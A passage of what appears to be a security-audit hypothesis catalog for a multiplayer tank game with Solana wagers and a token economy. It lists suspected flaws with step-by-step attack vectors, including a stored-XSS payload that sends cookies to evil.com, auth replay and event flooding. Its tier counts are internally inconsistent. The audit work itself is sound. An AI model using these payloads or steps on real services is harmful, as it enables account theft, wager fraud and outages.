4. Match completes — both get `recordMatchPlayed()` credit
5. Emit `playAgainRequest` — repeat
6. After 100 matches (~30 min), earn 3,850 SHOT from milestones
7. After that: 500 SHOT every 50 matches indefinitely

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `shot-token.js` | `recordMatchPlayed` | 95-129 | No dedup, no gameplay threshold |
| `main.js` | match completion | 838-850 | Calls recordMatchPlayed unconditionally |

### Potential Impact
**Severity if confirmed:** CRITICAL — unlimited SHOT inflation, reward pool drained

---

## H034: SHOT Reward Pool Supply Cap Bypass

**Category:** Token / Economic
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** Token supply inflation bugs

### Hypothesis
The 7M SHOT reward pool constant is never enforced — `recordMatchPlayed()` awards tokens without checking if total emissions exceed the cap.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `shot-token.js` | `recordMatchPlayed` | 95-129 | No global emission counter |
| `shot-token.js` | `SHOT_TOKEN_CONFIG` | 29-39 | `rewardPool: 7_000_000` (decorative) |

### Potential Impact
**Severity if confirmed:** CRITICAL — infinite token supply exceeds advertised 10M total

---

## H035: Prestige Burn Reversal via Server Restart

**Category:** Token / Economic
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Novel — ephemeral state destroying deflationary mechanism

### Hypothesis
All prestige burn state (SHOT balances, totalBurned, prestigeTier) is in-memory. A server restart erases all burns, reversing the deflationary mechanism and allowing re-grinding of milestones.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `shot-token.js` | `playerShotState` | 65 | `= {}` — in-memory only |
| `shot-token.js` | `prestigeBurn` | 137-173 | Deducts from ephemeral state |

### Potential Impact
**Severity if confirmed:** HIGH — deflationary mechanism is fictional

---

## H036: Gold Farming via Arbitrary Fire Position

**Category:** Token / Economic
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** Novel — physics trust boundary violation

### Hypothesis
By setting `startX`/`startY` directly above the opponent's tank, a player guarantees maximum damage every turn, earning 900 Gold per turn (enough to buy any weapon in 3-4 turns).

### Attack Vector
1. Read opponent tank position from game state
2. Emit `fire` with `startX: <opponent_x>, startY: <opponent_y - 30>, power: 1, angle: PI/2`
3. Projectile spawns above opponent, drops straight down
4. Max damage = 60 HP → Gold = `floor(60 * 15) = 900`
5. Repeat every turn — dominate economy

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `fire` | 671 | Uses client startX/startY |
| `physics.js` | `processShot` | 59-64 | startX/startY as projectile origin |

### Potential Impact
**Severity if confirmed:** CRITICAL — complete Gold economy bypass

---

## H037: Play-Again Wager Deletion — Free Rematch

**Category:** Token / Economic
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Novel — state reset mid-protocol

### Hypothesis
`playAgainRequest` deletes `wagerStates[roomId]`, making any rematch a free game regardless of the original wager amount.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `playAgainRequest` | 1019 | `delete wagerStates[client.roomId]` |

### Potential Impact
**Severity if confirmed:** HIGH — wager matches become free on rematch

---

## H038: Unfunded Wager Room Creation

**Category:** Token / Economic
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** Missing validation on financial operations

### Hypothesis
The room creator's SOL balance is NEVER verified — only the joiner gets a (broken) balance check. A creator with 0 SOL can host any wager tier.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `createRoom` | 354-410 | No verifyBalance call for creator |

### Potential Impact
**Severity if confirmed:** CRITICAL — unfunded wager matches

---

## H039: Weapon Firing Without Purchase (Inventory Bypass)

**Category:** Token / Economic
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Novel — authorization bypass in game economy

### Hypothesis
The `fire` handler validates weaponId against `WEAPON_DATA` (does it exist?) but NOT against `weaponInventories[roomId][client.id]` (does the player own it?). Any player can fire any weapon without purchasing.

### Attack Vector
1. Start match with only weapon 0 (Single Shot, free)
2. Emit `fire` with `weaponId: 12` (Atomic Bomb, 5000 Gold)
3. `WEAPON_DATA[12]` exists — check passes
4. No inventory check — fire proceeds
5. Deal massive damage with unpurchased weapon

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `fire` | 692 | Checks WEAPON_DATA, not inventory |

### Potential Impact
**Severity if confirmed:** HIGH — weapon economy bypass, unfair advantage

---

## H040: Host Tiebreak Advantage in Wagers

**Category:** Token / Economic
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** Systematic fairness bias

### Hypothesis
Ties always resolve in favor of the host (`winner: hostId`), giving a systematic advantage in wager matches to the player who creates rooms.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `match.js` | `isMatchOver` | 155-156 | `winner: hostId` on tie |
| `match.js` | `getRoundWinner` | 176 | `return hostId` on tie |

### Potential Impact
**Severity if confirmed:** MEDIUM — unfair wager advantage for room creators

---

## H041: Prestige Weapon Purchase Broken

**Category:** Token / Economic
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** Novel — incomplete feature

### Hypothesis
Prestige weapons (IDs 21, 24, 26, 27, 29) are in `PRESTIGE_WEAPONS` but `getWeapon()` only searches `WEAPON_CATALOG`, making them unpurchasable even for qualified players.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `Weapon.js` | `getWeapon` | 56-58 | Only searches WEAPON_CATALOG |

### Potential Impact
**Severity if confirmed:** LOW — broken feature, not exploitable

---

## H042: No Turn Timer — Infinite Stalling Griefing

**Category:** Token / Economic
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Griefing in turn-based games

### Hypothesis
No turn timer exists — a player can hold their turn indefinitely, forcing the opponent to either wait forever or disconnect (forfeit, losing their wager).

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | all battle logic | * | No turn timeout mechanism |

### Potential Impact
**Severity if confirmed:** HIGH — wager griefing via stalling

---

## H043: Stored XSS via Unsanitized Player Name

**Category:** Account Validation
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Stored XSS (CWE-79)

### Hypothesis
Player names are stored and broadcast without sanitization. A name containing `<script>` tags would be broadcast to all connected clients via `setRooms`.

### Attack Vector
1. Create room with `name: "<script>document.location='evil.com?c='+document.cookie</script>"`
2. Name broadcast via `io.emit('setRooms', ...)` to ALL connected clients
3. If any client renders names via innerHTML, script executes in every viewer's browser

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | createRoom | 364 | No name sanitization |
| `main.js` | setRooms broadcast | 342, 409 | Broadcasts to all clients |

### Potential Impact
**Severity if confirmed:** HIGH — account compromise via stored XSS

---

## H044: roomId Format Bypass and Socket.IO Room Injection

**Category:** Account Validation
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** Novel — Socket.IO room model abuse

### Hypothesis
Client-supplied roomId has no format validation — an array or very long string could cause unexpected behavior in Socket.IO's room management.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `joinRoom` | 288-290 | Raw user string in `client.join(roomId)` |

### Potential Impact
**Severity if confirmed:** MEDIUM — unexpected Socket.IO behavior

---

## H045: isHost Flag Staleness After Leave/Rejoin

**Category:** Account Validation
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** Stale authorization state

### Hypothesis
`client.isHost` is not reliably reset on all code paths. After leaving and rejoining a different room, `isHost` from the previous room could persist.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `joinRoom/leaveRoom/deleteRoom` | 327, 274 | isHost set/clear logic |

### Potential Impact
**Severity if confirmed:** MEDIUM — authorization confusion

---

## H046: MongoDB Injection via Player Name

**Category:** Account Validation
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** NoSQL injection (CWE-943)

### Hypothesis
Player names flow into MongoDB documents without sanitization. While Mongoose schemas provide type enforcement, a 10MB name could cause storage bloat.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | Match.create | 387-398 | `username: player.name` |

### Potential Impact
**Severity if confirmed:** MEDIUM — storage DoS, no data injection likely

---

## H047: Prototype Pollution via terrainPath Spread

**Category:** Account Validation
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** Prototype pollution attacks in Node.js

### Hypothesis
The `terrainPath` handler spreads unchecked objects into room state. A `__proto__` property in `hostPos` or `playerPos` could pollute Object.prototype.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `terrainPath` | 937-964 | `{...hostPos}`, `{...playerPos}` |

### Potential Impact
**Severity if confirmed:** MEDIUM — modern JS engines mitigate most spread-based pollution

---

## H048: Non-Base58 Wallet Strings in Wager Flow

**Category:** Account Validation
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Input format bypass

### Hypothesis
Wallet addresses in createRoom/joinRoom payloads are never validated as Base58 Solana addresses — any string is accepted and stored.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | createRoom/joinRoom | 296, 370 | No format validation |

### Potential Impact
**Severity if confirmed:** HIGH — arbitrary strings as wallet identities

---

## H049: Object Payload in Color Field

**Category:** Account Validation
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** Type confusion

### Hypothesis
Sending `color: { $gt: "" }` or similar object could cause unexpected behavior in comparisons or rendering.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | joinRoom/createRoom | 329, 364 | No type check on color |

### Potential Impact
**Severity if confirmed:** LOW — Mongoose schema rejects at DB layer

---

## H050: PRNG State Recovery for Terrain Prediction

**Category:** Oracle / Data
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** V8 xorshift128+ state recovery

### Hypothesis
By observing terrain seeds and weapon array outputs, an attacker can recover the V8 `Math.random()` state and predict future terrain, tank positions, and first-turn selection.

### Attack Vector
1. Play several matches, record terrain seeds from `terrainGenerated` events
2. Use `createWeaponArray` with count: 100 to get 100 sequential PRNG outputs
3. Apply known xorshift128+ state recovery algorithms
4. Predict future terrain, tank positions, first-turn coin flip

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | line 881 | 881 | `Math.random()` terrain seed |
| `main.js` | `createWeaponArray` | 645-658 | PRNG leakage |

### Potential Impact
**Severity if confirmed:** HIGH — removes uncertainty from game start

---

## H051: Weapon Array PRNG Leakage

**Category:** Oracle / Data
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** PRNG state reconstruction from outputs

### Hypothesis
`createWeaponArray` with `count: 100` returns 100 sequential `Math.random()` outputs — sufficient to fully recover the PRNG state.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `createWeaponArray` | 645-658 | Direct PRNG output to client |

### Potential Impact
**Severity if confirmed:** HIGH — PRNG fully predictable

---

## H052: Room ID Enumeration and Uninvited Joining

**Category:** Oracle / Data
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** Enumeration attacks

### Hypothesis
Room IDs are 6-char base-32 (`Math.random().toString(32).slice(2,8)`) — with PRNG prediction, future room IDs can be computed; without prediction, the keyspace is brute-forceable.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | createRoom | 360 | `Math.random().toString(32).slice(2,8)` |

### Potential Impact
**Severity if confirmed:** MEDIUM — uninvited room access

---

## H053: Auth Timestamp Manipulation

**Category:** Oracle / Data
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** Timestamp manipulation

### Hypothesis
The 60-second future allowance on auth timestamps extends the effective auth window to ~6 minutes.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `auth.js` | timestamp check | 72-74 | `age < -60000` |

### Potential Impact
**Severity if confirmed:** LOW — extends replay window slightly

---

## H054: Auth Replay Attack Within 5-Minute Window

**Category:** Oracle / Data
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Replay attacks (CWE-294)

### Hypothesis
The same signed auth message can be replayed unlimited times within the 5-minute window — no nonce, no used-signature tracking.

### Attack Vector
1. Intercept auth payload (via CORS wildcard cross-origin attack)
2. Connect new socket
3. Replay same `{ walletAddress, message, signature, timestamp }`
4. Authenticate as victim's wallet

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `auth.js` | `handleAuthenticate` | 108-133 | No nonce, no replay tracking |
| `main.js` | `authenticate` | 170-177 | No rate limiting |

### Potential Impact
**Severity if confirmed:** HIGH — wallet impersonation

---

## H055: RPC Response Staleness — Double-Entry Wager

**Category:** Oracle / Data
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** Stale oracle data exploits

### Hypothesis
A player could initiate a withdrawal from their wallet and join a wager room in the same second — the RPC returns pre-withdrawal balance.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `solana.js` | `verifyBalance` | 80-102 | No slot/staleness check |

### Potential Impact
**Severity if confirmed:** MEDIUM — theoretical with stub settlement

---

## H056: /stats Endpoint Reconnaissance

**Category:** Admin
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Information disclosure (CWE-200)

### Hypothesis
The unauthenticated `/stats` endpoint reveals real-time financial data, connection counts, error messages, and server uptime — providing reconnaissance for targeted attacks.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `index.js` | `/stats` route | 34 | No auth |
| `monitoring.js` | `getStats` | 166-211 | Returns everything |

### Potential Impact
**Severity if confirmed:** HIGH — operational intelligence for attackers

---

## H057: Settlement Error Message Leakage

**Category:** Admin
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** CWE-209

### Hypothesis
Raw `err.message` from Solana SDK/MongoDB is sent to clients in `matchEnd` events, leaking RPC URLs, internal state, or stack traces.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | settlement catch | 825-826 | `settlementInfo = { error: err.message }` |

### Potential Impact
**Severity if confirmed:** MEDIUM — information leakage

---

## H058: MongoDB Connection String Exposure

**Category:** Admin
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** Credential leakage via error logging

### Hypothesis
MongoDB connection failure logs the full error message, which may contain the connection string (with credentials) in cloud log aggregation services.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `index.js` | MongoDB catch | 47-48 | `console.error('MongoDB connection error:', err.message)` |

### Potential Impact
**Severity if confirmed:** MEDIUM — credential exposure in logs

---

## H059: No Admin Controls for Active Exploit Mitigation

**Category:** Admin
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Operational security gap

### Hypothesis
With no admin interface (no kick, no ban, no pause-wagers, no force-settle), the only response to an active exploit is a server restart — which wipes all in-memory state including active wagers.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | entire file | * | No admin events |

### Potential Impact
**Severity if confirmed:** HIGH — no incident response capability

---

## H060: nodemon in Production Dependencies

**Category:** Admin
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** Dev tools in production

### Hypothesis
nodemon v1.3.3 (2015) in production deps adds attack surface via its dependency tree.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `package.json` | dependencies | 22 | `"nodemon": "^1.3.3"` |

### Potential Impact
**Severity if confirmed:** LOW — increased attack surface, no direct exploit

---

## H061: No uncaughtException Handler — Single Error Server Crash

**Category:** Error Handling
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** Node.js process crash (CWE-755)

### Hypothesis
The server has no `process.on('uncaughtException')` or `process.on('unhandledRejection')` handlers. Any unhandled error kills the process, wiping all in-memory state.

### Attack Vector
1. Send any payload that triggers an unhandled error (e.g., null payload: H015)
2. Process exits
3. All rooms, wagers, Gold, SHOT state, weapons, matches destroyed
4. Active wagers lost with no settlement

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `index.js` | entire file | * | No process error handlers |
| `main.js` | async handlers | * | No try/catch on most handlers |

### Potential Impact
**Severity if confirmed:** CRITICAL — single-packet server kill + total state loss

---

## H062: Fire Handler Unhandled Rejection Cascade

**Category:** Error Handling
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** Node.js unhandled promise rejection

### Hypothesis
The 200-line async `fire` handler has no top-level try/catch. Any error during physics, damage, Gold, settlement, or SHOT emission propagates as an unhandled rejection.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `fire` | 671-872 | Async, no try/catch |

### Potential Impact
**Severity if confirmed:** CRITICAL — process crash from fire event

---

## H063: trackError() Never Called

**Category:** Error Handling
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** Dead code / missing telemetry

### Hypothesis
`trackError()` is imported in main.js but never called anywhere in production code. Errors accumulate silently with no tracking.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `monitoring.js` | `trackError` | 129-140 | Exported but never called |

### Potential Impact
**Severity if confirmed:** MEDIUM — no error visibility

---

## H064: Settlement Error Still Transitions to COMPLETE

**Category:** Error Handling
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Error recovery failure

### Hypothesis
If `settleMatch()` throws, the catch block logs the error but the match still transitions to COMPLETE. The settlement failure is silent — match marked as done without payout.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | settlement catch | 823-827 | Still emits matchEnd |
| `match.js` | `transitionState` | 42-54 | Called regardless of settlement outcome |

### Potential Impact
**Severity if confirmed:** HIGH — silent settlement failure

---

## H065: MongoDB Disconnect Silent State Divergence

**Category:** Error Handling
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** Split-brain state

### Hypothesis
If MongoDB disconnects mid-session, `persistRoom()` and `Match.create()` calls fail silently (caught by try/catch), causing in-memory and database state to diverge.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | persistRoom | 56-86 | Catches errors silently |

### Potential Impact
**Severity if confirmed:** MEDIUM — state divergence

---

## H066: Balance Check Error Masking

**Category:** Error Handling
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Error value confusion

### Hypothesis
`verifyBalance()` returns `{ sufficient: false, balance: 0 }` on error — indistinguishable from a genuine zero-balance wallet. Combined with H027's fail-open guard, this guarantees entry.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `solana.js` | `verifyBalance` catch | 95-102 | Returns 0 on error |

### Potential Impact
**Severity if confirmed:** HIGH — undistinguishable error vs genuine balance

---

## H067: Auth Error Detail Leakage

**Category:** Error Handling
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** CWE-209

### Hypothesis
Auth verification errors return raw `err.message` from tweetnacl/jsonwebtoken, revealing implementation details (jwt malformed, signature mismatch, etc.).

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `auth.js` | catch blocks | 53, 105 | Raw err.message to client |

### Potential Impact
**Severity if confirmed:** LOW — information leakage for format probing

---

## H068: Concurrent Fire Events During Settlement Window

**Category:** Timing
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** TOCTOU in async systems

### Hypothesis
During the async settlement window (after winning shot, before state transition), additional fire events can be processed, potentially triggering additional settlements or corrupting the match state.

### Attack Vector
1. Player A fires winning shot → async settlement starts
2. Player B rapidly fires before settlement completes
3. Player B's fire reads stale `matchStates` (still BATTLE)
4. If B's shot also triggers match-end: second settlement

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `fire` | 671-872 | No mutex |

### Potential Impact
**Severity if confirmed:** CRITICAL — double settlement

---

## H069: Disconnect During SETTLING Destroys State

**Category:** Timing
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** State destruction during async operation

### Hypothesis
Disconnecting during settlement destroys the room state (via `removeRoom()`) while the settlement async operation is still reading from it, causing undefined behavior or crash.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `disconnect` | 180-224 | Calls removeRoom unconditionally |

### Potential Impact
**Severity if confirmed:** CRITICAL — settlement reads destroyed state

---

## H070: Room Deletion During Active Settlement

**Category:** Timing
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** Use-after-free pattern

### Hypothesis
Emitting `deleteRoom` during an active settlement deletes `wagerStates[roomId]` and all room state, while the in-flight settlement is still referencing it.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `deleteRoom` | 274-284 | No settlement-in-progress check |
| `main.js` | `removeRoom` | 88-98 | Deletes wagerStates immediately |

### Potential Impact
**Severity if confirmed:** CRITICAL — settlement data destroyed mid-operation

---

## H071: Fire Before Terrain Generated

**Category:** Timing
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Novel — sequence violation

### Hypothesis
If `fire` is emitted before `requestTerrain` generates terrain, the `currentTurn` is null, and the turn check may behave unexpectedly.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `fire` turn check | 681-684 | Compares client.id with ms.currentTurn |

### Potential Impact
**Severity if confirmed:** HIGH — out-of-sequence game actions

---

## H072: Duplicate Disconnect + LeaveRoom Settlement

**Category:** Timing
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Duplicate code paths

### Hypothesis
`disconnect` and `leaveRoom` both contain complete settlement logic. If `leaveRoom` triggers immediately before `disconnect` fires for the same socket, both run settlement.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `disconnect` | 180-224 | Settlement logic |
| `main.js` | `leaveRoom` | 228-263 | Duplicate settlement logic |

### Potential Impact
**Severity if confirmed:** HIGH — double settlement from same player

---

## H073: Async Settlement + playAgainRequest Wager Clear

**Category:** Timing
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** Novel — concurrent state mutation

### Hypothesis
During the async settlement window, a `playAgainRequest` event can delete wagerStates, causing the in-flight settlement to read undefined data.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `playAgainRequest` | 998-1044 | Deletes wagerStates immediately |
| `main.js` | settlement | 807-830 | Reads wagerStates asynchronously |

### Potential Impact
**Severity if confirmed:** CRITICAL — settlement failure

---

## H074: Event Flooding DoS

**Category:** Timing / DoS
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Rate limiting absence (CWE-770)

### Hypothesis
No rate limiting on any socket event. An attacker can flood the server with thousands of events per second, exhausting CPU and memory.

### Attack Vector
1. Connect socket
2. Send 10,000 `authenticate` events per second (each invokes nacl.sign.verify — CPU-intensive)
3. Server CPU pegged at 100%
4. All other players experience lag or disconnection

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | all handlers | * | No rate limiting |

### Potential Impact
**Severity if confirmed:** HIGH — complete server DoS

---

## H075: Socket.IO Reconnection Without Re-Authentication

**Category:** Timing
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** Session persistence on reconnect

### Hypothesis
If a socket reconnects (e.g., network glitch), the `authenticatedWallets[client.id]` entry was deleted on disconnect. The reconnected socket has a new ID and is unauthenticated, but may try to rejoin a room.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `disconnect` | 180 | Cleans up auth state |

### Potential Impact
**Severity if confirmed:** MEDIUM — session state loss on reconnect

---

## Cross-Strategy Analysis

### Potentially Related Strategies (Chained Attacks)

| Strategy A | Strategy B | Potential Combination |
|------------|------------|----------------------|
| H006 (skip auth) | H001 (unauth wager) | Completely unauthenticated wager creation |
| H008 (CORS hijack) | H054 (auth replay) | Steal auth from website visitors, replay on new connection |
| H015 (null crash) | H061 (no exception handler) | Single null packet kills server + all state |
| H012 (position spoof) | H036 (Gold farm) | Guaranteed max Gold → buy all weapons → guaranteed wins |
| H027 (0-SOL join) | H038 (unfunded create) | Both players in wager match with 0 SOL |
| H020 (double settle) | H069 (disconnect during settle) | Two settlements + state destruction |
| H033 (SHOT farm) | H034 (no supply cap) | Unlimited SHOT farming with no ceiling |
| H051 (PRNG leak) | H050 (terrain predict) | Full game predictability |
| H039 (fire any weapon) | H012 (position spoof) | Max weapon + guaranteed hit = instant win |
| H021 (playAgain wipes wager) | H073 (async settle + clear) | Settlement reads deleted wager data |

### Investigation Priority Order

**Tier 1 — Investigate First (22 strategies):**
H001, H002, H003, H006, H009, H011, H012, H015, H019, H020, H021, H022, H027, H033, H034, H036, H038, H061, H062, H068, H069, H070, H073

**Tier 2 — High Priority (28 strategies):**
H004, H005, H007, H008, H010, H013, H017, H023, H024, H028, H029, H030, H031, H035, H037, H039, H042, H043, H048, H050, H051, H054, H056, H059, H064, H066, H071, H072, H074

**Tier 3 — Standard (25 strategies):**
H014, H016, H018, H025, H026, H032, H040, H041, H044, H045, H046, H047, H049, H052, H053, H055, H057, H058, H060, H063, H065, H067, H075

---

## Statistics

| Category | Count | Tier 1 | Tier 2 | Tier 3 |
|----------|-------|--------|--------|--------|
| Access Control | 8 | 3 | 4 | 1 |
| Arithmetic & Input | 10 | 4 | 3 | 3 |
| State Machine | 8 | 4 | 3 | 1 |
| CPI & External | 6 | 1 | 4 | 1 |
| Token & Economic | 10 | 4 | 4 | 2 |
| Account Validation | 7 | 0 | 2 | 5 |
| Oracle & Data | 6 | 0 | 4 | 2 |
| Admin & Config | 5 | 0 | 2 | 3 |
| Error Handling | 7 | 3 | 2 | 2 |
| Timing & Ordering | 8 | 5 | 3 | 0 |
| **TOTAL** | **75** | **24** | **31** | **20** |

Novel strategies (not derived from known exploit patterns): 18/75 (24%) — exceeds 20% minimum.

---

## Notes for Investigators

### General Guidance
- Each strategy should be investigated independently
- Reference `.audit/ARCHITECTURE.md` for architectural context
- Write findings to `.audit/findings/H{XXX}.md`
- Don't skip strategies even if they seem unlikely
- Note any discoveries that suggest NEW strategies (supplemental)
- Check `.audit/findings/` for overlap before analyzing a code path already covered

### Status Definitions
- **CONFIRMED**: Vulnerability exists and is exploitable
- **POTENTIAL**: Could be vulnerable under specific conditions
- **NOT VULNERABLE**: Protected against this attack
- **NEEDS MANUAL REVIEW**: Couldn't determine, needs expert

---

**This catalog is the input for Phase 4: Parallel Investigation**
